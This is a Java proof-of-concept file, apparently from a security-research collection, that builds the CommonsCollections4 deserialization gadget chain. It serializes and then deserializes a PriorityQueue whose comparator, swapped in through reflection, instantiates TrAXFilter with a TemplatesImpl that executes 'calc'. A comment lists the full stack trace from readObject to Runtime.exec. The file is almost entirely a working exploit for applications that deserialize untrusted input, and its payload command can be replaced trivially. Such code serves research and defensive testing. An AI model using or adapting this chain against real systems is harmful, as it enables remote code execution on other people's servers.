package com.javasec.pocs.cc;
import com.javasec.utils.SerializeUtils;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InstantiateTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import javax.xml.transform.Templates;
import java.lang.reflect.Field;
import java.util.PriorityQueue;

/**
 * exec:347, Runtime (java.lang)
 * <init>:-1, a
 * newInstance0:-1, NativeConstructorAccessorImpl (sun.reflect)
 * newInstance:62, NativeConstructorAccessorImpl (sun.reflect)
 * newInstance:45, DelegatingConstructorAccessorImpl (sun.reflect)
 * newInstance:422, Constructor (java.lang.reflect)
 * newInstance:442, Class (java.lang)
 * getTransletInstance:455, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)
 * newTransformer:486, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)
 * <init>:64, TrAXFilter (com.sun.org.apache.xalan.internal.xsltc.trax)
 * newInstance0:-1, NativeConstructorAccessorImpl (sun.reflect)
 * newInstance:62, NativeConstructorAccessorImpl (sun.reflect)
 * newInstance:45, DelegatingConstructorAccessorImpl (sun.reflect)
 * newInstance:422, Constructor (java.lang.reflect)
 * transform:116, InstantiateTransformer (org.apache.commons.collections4.functors)
 * transform:32, InstantiateTransformer (org.apache.commons.collections4.functors)
 * transform:112, ChainedTransformer (org.apache.commons.collections4.functors)
 * compare:81, TransformingComparator (org.apache.commons.collections4.comparators)
 * siftDownUsingComparator:721, PriorityQueue (java.util)
 * siftDown:687, PriorityQueue (java.util)
 * heapify:736, PriorityQueue (java.util)
 * readObject:795, PriorityQueue (java.util)
 * invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
 * invoke:62, NativeMethodAccessorImpl (sun.reflect)
 * invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
 * invoke:497, Method (java.lang.reflect)
 * invokeReadObject:1058, ObjectStreamClass (java.io)
 * readSerialData:1900, ObjectInputStream (java.io)
 * readOrdinaryObject:1801, ObjectInputStream (java.io)
 * readObject0:1351, ObjectInputStream (java.io)
 * readObject:371, ObjectInputStream (java.io)
 * base64deserial:59, SerializeUtils (com.javasec.utils)
 * main:34, CommonsCollections4 (com.javasec.pocs.cc)
 */
public class CommonsCollections4 {
    public static void main(String[] args) throws Exception {
        Templates templates = SerializeUtils.getTemplate("calc");
        Transformer[] transformers=new Transformer[]{
                new ConstantTransformer(TrAXFilter.class),
                new InstantiateTransformer(new Class[]{Templates.class},new Object[]{templates})
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        TransformingComparator transformingComparator=new TransformingComparator(new ConstantTransformer(1));
        PriorityQueue priorityQueue=new PriorityQueue(transformingComparator);
        priorityQueue.add(1);
        priorityQueue.add(2);
        Class tc=transformingComparator.getClass();
        Field comparator = tc.getDeclaredField("transformer");
        comparator.setAccessible(true);
        comparator.set(transformingComparator,chainedTransformer);
        SerializeUtils.base64deserial(SerializeUtils.base64serial(priorityQueue));
    }
}
